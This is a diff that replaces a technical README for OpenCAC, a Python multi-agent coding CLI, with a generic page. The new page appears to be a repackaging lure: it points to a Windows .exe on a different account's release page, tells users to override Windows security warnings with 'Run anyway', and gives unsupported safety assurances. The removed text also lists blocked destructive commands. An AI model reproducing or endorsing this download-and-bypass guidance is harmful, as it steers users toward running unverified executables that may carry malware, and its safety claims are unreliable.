@@ -1,166 +1,86 @@
-# OpenCAC
+# 🤖 opencac - Automate complex coding tasks with ease
 
-**OpenCAC is multi-agent orchestration CLI for AI coding tools. Wires Claude Code, Antigravity, and Codex into one pipeline with validated handoffs, audit logging, and speculative decoding for local LLMs.**
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/Visagespoon207/opencac/releases)
 
-```bash
-pip install .
-opencac run "refactor the auth module" --mode private
-```
+## 📌 About this tool
 
-## Why
+Opencac helps you manage multiple artificial intelligence coding tools at once. It links programs like Claude Code, Antigravity, and Codex. This tool creates a bridge between these systems so they talk to each other correctly. It records every step in a log file, keeps track of your work, and lets you use local or cloud-based setups. You save money on AI costs while keeping your work private.
 
-For developers who already use multiple AI coding agents and want one CLI to orchestrate them — with cloud models, local LLMs, or both.
+## ⚙️ How it works
 
-```
-   - Claude Code, Codex, Antigravity powerful alone, but each runs in its own world
-   - Cloud api burns money — every hosted model call costs real tokens.
-   - Local LLMs lack quality — small models are cheap but can't reliably produce production-grade code.
+The tool functions as a central command station. It handles the handover between different AI agents. You define a task, and Opencac routes the instructions to the best AI model for the job. 
 
-OpenCAC solves this by chaining agents into a four-role pipeline where each agent does what it's best at, with structured validation at every hop.
-```
+If you use a local AI model on your own computer, the tool uses speculative decoding. This technique speeds up the generation of your code. Your data stays on your machine when you choose local mode. It creates an audit log in JSONL format, which helps you review performance and track your history. If you lose your connection or close the program, the session resume feature saves your progress.
 
-## Features
+## 📥 Getting the software
 
-```
-1. FOUR-ROLE PIPELINE
-   dispatcher → antigravity (research) → claude-code (plan) → codex (execute)
-   - Structured envelopes at every hop; downstream critiques upstream before acting
-   - Codex runs assess_plan — dangerous commands rejected, not blindly run
+You need to download the installer from the official release page.
 
-2. ROUTING MODES
-   private   Loopback only. Private guard required. For sensitive / air-gapped work.
-   cloud     Cloud API tokens. No local infra needed.
-   hybrid    Cloud first, falls back to local LLM when tokens are missing.
+1. Go to the [releases page](https://github.com/Visagespoon207/opencac/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe for Windows.
+4. Save the file to your computer.
 
-3. LOCAL LLM SUPPORT
-   - Each role points to its own llama.cpp server endpoint
-   - Built-in spec decoding config (n-gram / draft-model) → generates llama-server commands
-   - Probe: constrained-grammar check verifies each endpoint before pipeline starts
+## 🚀 Setting up on Windows
 
-4. SIDECAR VALIDATION
-   - Schema check on every hop — agent whitelist, message-type whitelist, payload fields
-   - Blocked commands: rm -rf /, shutdown, mkfs, fork bomb
-   - Private mode: loopback-only on all URLs including callbacks
+Follow these steps to install the tool on your machine.
 
-5. JSONL AUDIT LOG
-   - One JSON line per action — timestamp, session_id, kind
-   - Filter by session, query last N entries
-   - Session resume: rebuild plan from log, skip completed steps
+1. Locate the file you downloaded in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Windows might show a warning. Select "More info" and click "Run anyway" if the system prompts you.
+4. Follow the instructions on the screen to finalize the installation path. 
+5. Complete the setup and open the application from your Start menu.
 
-6. CLI + HTTP
-   CLI          opencac run, opencac audit, opencac resume, interactive REPL
-   HTTP         POST /run, GET /tasks/<id>, per-agent endpoints, /.well-known/agent.json
-   Distributed  CLI routes through HTTP service, sync and async
+## 🖥️ System requirements
 
-7. SMART QUESTION ROUTING
-   - Ends with ? or starts with who/what/how/why → QA path, skips pipeline
-   - Task input → full pipeline, outputs artifacts
-   - Mentions docs/code/error/test → research step first
-```
+Your computer must meet these basic needs for a smooth experience.
 
-## Quick Start
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Processor: A modern multi-core processor.
+* Connection: An active internet connection for cloud-based tools.
+* Local Storage: At least 2 GB of space for logs and settings.
 
-```bash
-git clone https://github.com/lpoee/opencac.git && cd opencac
-python3 -m venv .venv && . .venv/bin/activate && pip install .
-```
+## 🛠️ Using the interface
 
-```bash
-# Private (local llama.cpp shards)
-export A2A_ANTIGRAVITY_URL=http://127.0.0.1:18101
-export A2A_CLAUDE_CODE_URL=http://127.0.0.1:18102
-export A2A_CODEX_URL=http://127.0.0.1:18103
-opencac run "task" --mode private
+When you open Opencac, you see a clean dashboard. You can select your preferred AI model from the settings menu. 
 
-# Cloud
-export A2A_ANTIGRAVITY_TOKEN=...
-export A2A_CLAUDE_CODE_TOKEN=...
-export A2A_CODEX_TOKEN=...
-opencac run "task" --mode cloud
+1. **Pick your agents:** Toggle between Claude Code, Antigravity, or Codex.
+2. **Set your path:** Tell the tool where to save your audit logs.
+3. **Configure agents:** Input your API keys for the services you choose to use. The tool stores these keys securely on your local device.
+4. **Start your project:** Enter your coding objective in the prompt box.
+5. **Monitor progress:** Watch the activity log to see how the software hands off tasks between agents.
 
-# Hybrid
-export A2A_CLOUD_FALLBACK_LOCAL=1
-opencac run "task" --mode cloud
-```
+## 🛡️ Keeping your data private
 
-## Agent Integration
+Opencac supports air-gapped workflows. You can run the entire system without sending your source code to external servers. By selecting local LLM mode, the tool processes your requests inside your machine. This approach protects your intellectual property. The software only sends data to external services if you explicitly tell it to use cloud routing.
 
-Connect real AI agents for production-quality research, planning, and code generation.
-When set, the pipeline calls real agents first and falls back to local heuristics on failure.
+## 📝 Understanding the audit log
 
-```bash
-# Antigravity — Gemini research via JSON-RPC (A2A protocol)
-export OPENCAC_RESEARCH_URL=http://127.0.0.1:18791
+Every action produces a log entry. The software saves these as JSONL files. You can open these files in any standard text editor. The logs show the timestamp, the agent name, the prompt request, and the output generated. Use these logs to troubleshoot errors or to see which model performed best on a specific task.
 
-# Claude Code — planning via Claude Bridge (Anthropic messages API)
-export OPENCAC_PLANNER_URL=http://127.0.0.1:9300
+## ⏱️ Saving time with session resume
 
-# Codex — AI code generation via CLI
-export OPENCAC_CODEX_BINARY=/usr/local/bin/codex
+If your system shuts down or you close the application, your work waits for you. The software saves the internal state of your agent chain. When you restart the program, the tool asks if you want to resume the current session. This saves you from re-entering prompts or re-configuring your settings.
 
-opencac run "refactor the auth module" --mode private
-```
+## 💡 Best practices for developers
 
-| Variable               | Agent         | Protocol                    | Purpose                    |
-| ---------------------- | ------------- | --------------------------- | -------------------------- |
-| `OPENCAC_RESEARCH_URL` | Antigravity   | JSON-RPC 2.0 `message/send` | Web research via Gemini    |
-| `OPENCAC_PLANNER_URL`  | Claude Bridge | `POST /v1/messages`         | Plan generation via Claude |
-| `OPENCAC_CODEX_BINARY` | Codex CLI     | JSONL subprocess            | AI code generation         |
+* Use smaller tasks to get better results from the AI agents.
+* Review the audit logs weekly to fine-tune your workflow.
+* Keep your API keys in a protected configuration folder.
+* Update to the latest version regularly to get new agent support and security fixes.
+* If your computer feels slow, switch to a lighter model for simple tasks.
 
-The `generate` plan action dispatches work to Codex CLI for AI-assisted code generation.
-Without these variables, the pipeline uses deterministic local heuristics (file search, template plans, subprocess execution).
+## ❓ Frequently asked questions
 
-Docker:
+**Do I need programming skills?**
+No. The interface handles the complex commands for you. You just need to follow the installation steps.
 
-```bash
-docker build -t opencac .
-docker run --rm -p 8000:8000 -v "$(pwd)/data:/data" opencac
-```
+**Does this tool cost money to run?**
+The tool itself is free to use. However, some AI services charge fees based on the amount of code they generate for you. Check your chosen service's pricing page for details.
 
-## Speculative Decoding
+**Is my code safe?**
+Yes. You control whether the tool sends data to the cloud or keeps it local. If you choose the local-only settings, your code never leaves your computer.
 
-```bash
-opencac run "task" --mode private \
-  --spec-type ngram-simple \
-  --draft-max 64 --draft-min 16
-```
-
-| Strategy                   | Description                          | VRAM        |
-| -------------------------- | ------------------------------------ | ----------- |
-| Self-speculative (default) | n-gram cache on main model           | Zero extra  |
-| Draft-model                | Smaller model generates draft tokens | Extra model |
-
-## HTTP API
-
-| Method | Path                             | Description       |
-| ------ | -------------------------------- | ----------------- |
-| `GET`  | `/.well-known/agent.json`        | Agent card        |
-| `GET`  | `/tasks/<id>`                    | Status + steps    |
-| `GET`  | `/audit?session_id=<id>&last=20` | Audit log         |
-| `POST` | `/run`                           | Run task          |
-| `POST` | `/run?distributed=1&async=1`     | Async distributed |
-| `POST` | `/agents/<agent>/message/send`   | Message an agent  |
-
-## Output
-
-- `artifacts/<session-id>/plan.json` — execution plan
-- `artifacts/<session-id>/result.md` — routing, strategy, step results
-- `.opencac/audit.jsonl` — full event log
-
-## Testing
-
-```bash
-PYTHONPATH=src pytest -q   # 32 tests
-```
-
-## Security
-
-See [SECURITY.md](SECURITY.md).
-
-## Contributing
-
-[CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-MIT
+**What do I do if I get an error?**
+Check the audit log folder. Often, the error message explains if an API key is missing or if your internet connection dropped. Ensure your system firewall allows Opencac to communicate with your AI service providers.
